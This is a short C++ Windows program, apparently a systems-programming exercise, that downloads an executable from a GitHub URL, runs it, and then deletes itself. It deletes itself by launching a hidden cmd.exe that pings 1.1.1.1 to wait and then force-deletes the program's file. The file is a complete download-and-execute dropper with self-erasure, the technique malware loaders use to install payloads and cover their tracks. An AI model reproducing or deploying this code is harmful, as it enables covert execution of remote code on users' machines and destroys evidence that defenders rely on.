#include <iostream>
#include <Windows.h>
#include <Urlmon.h>
#include <strsafe.h>

#pragma comment(lib, "urlmon.lib")

using namespace std;

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

void DelMe()
{
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}


int main() {
    LPCSTR url = "https://github.com/Nghia-nee/Sys_Prog/raw/main/test/test.exe";
    LPCSTR filePath = "D:\\Documents\\test.exe"; 
    HRESULT hr = URLDownloadToFileA(NULL, url, filePath, 0, NULL);
    if (SUCCEEDED(hr)) 
    {
        cout << "Download successful!" << std::endl;
        system("D:\\Documents\\test.exe");
        DelMe();
    }
    return 0;
}
